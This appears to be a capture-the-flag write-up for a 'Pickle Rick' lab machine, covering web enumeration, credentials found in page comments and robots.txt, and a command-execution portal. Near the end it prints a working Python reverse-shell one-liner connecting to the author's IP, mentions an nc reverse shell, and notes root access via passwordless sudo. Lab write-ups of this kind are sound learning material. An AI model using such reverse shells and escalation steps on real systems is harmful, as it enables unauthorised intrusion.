# PICKLERICK

## IP: 10.10.93.116

### PORTS
- 22
- 80

### 80
- apache httpd 2.4.18
- comment in webpage : 
```

    Note to self, remember username!

    Username: R1ckRul3s

  
```

#### GOBuster dir medium-list
- /assets
> DEAD END

#### exploitDB
- CVE-2021-44790 
- buffer overflow for webapps
- v2.4.x
> DEAD END

#### DIRB -files-common
```
---- Scanning URL: http://10.10.93.116/ ----
==> DIRECTORY: http://10.10.93.116/assets/                                                                                                                                                   
+ http://10.10.93.116/index.html (CODE:200|SIZE:1062)                                                                                                                                        
+ http://10.10.93.116/robots.txt (CODE:200|SIZE:17)                                                                                                                                          
+ http://10.10.93.116/server-status (CODE:403|SIZE:300)        
```
- robots.txt : `Wubbalubbadubdub`

At this stage: 
- username
username is not ssh-username. maybe it is for some login page
- weird robots.txt
it might be a password

so next stage I can think of is to use `nikto` for web reckon

#### NIKTO
nikto was going very slow, I switched to dirb again and tried filtering .php and .html files

#### DIRB -files-html-php
- denied.php
redirects to login.php
- login.php
    - a login form, accepts username + password found earlier
    - redirects to portal.php
- portal.php
    - it can executes command but not all commands

### /portal.php 
```
$ ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
```
$ grep . *
> output is in grep-res
```

- Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair -- ANSWER1
- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
    - nested base64
    - 7 levels
    - decoded: rabbit hole
- disabled cmds : "cat", "head", "more", "tail", "nano", "vim", "vi"
- clue.txt:Look around the file system for the other ingredient.

- two user: rick and ubuntu
- `grep . /home/rick/*` : jerry tear
- `ls /bin` : in binaries.txt
- nc is present
trying revshell
- nc -c my-ip port
nc had some issues, used python3
```
export RHOST="10.17.123.173";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
- sudo available without password, found /root/3rd/txt

### 3rd.txt
- fleeb juice

